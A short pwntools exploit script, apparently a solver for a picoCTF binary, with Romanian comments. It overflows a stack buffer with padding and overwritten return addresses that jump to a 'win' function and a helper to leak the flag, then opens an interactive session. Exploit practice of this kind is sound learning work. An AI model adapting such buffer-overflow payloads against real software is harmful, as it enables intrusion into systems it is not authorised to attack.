from pwn import *
elf = ELF('/home/kali/Downloads/vuln')
#p=elf.process()
p=remote('saturn.picoctf.net', 52084)
#distance from buffer to rip
#A+4(ebp)+(new rip)
#14+RIP

#payload = p32(0x8049E10)
payload = b'\x90'*14
payload += p32(0x8049D90) #win
payload += p32(0x8049E10) #under constr devine ret addr la win
payload += p32(0x8049E10) #a bunch of undr constr to leak the flag
payload += p32(0x8049E10) #to get a bunch of %p 's 
payload += p32(0x8049E10)
payload += p32(0x8049E10)
payload += p32(0x8049E10)
payload += p32(0x8049E10)
payload += p32(0x8049E10)
payload += p32(0x8049E10)
payload += p32(0x8049E10)
payload += p32(0x8049E10)
payload += p32(0x8049EB0) #main

#ce cred ca se intampla e ca win nu le printeaza doar le pune in stack?
#si pe putem leakui cu under constr.
#pronanil un rop chain ar fi cea mai buna idee..
#pop rsp; ret
#pop rsp; ret?


#gdb.attach(p, gdbscript='b* 0x8049EE4')
p.recvuntil(b'\n')
p.sendline(payload)



p.interactive()
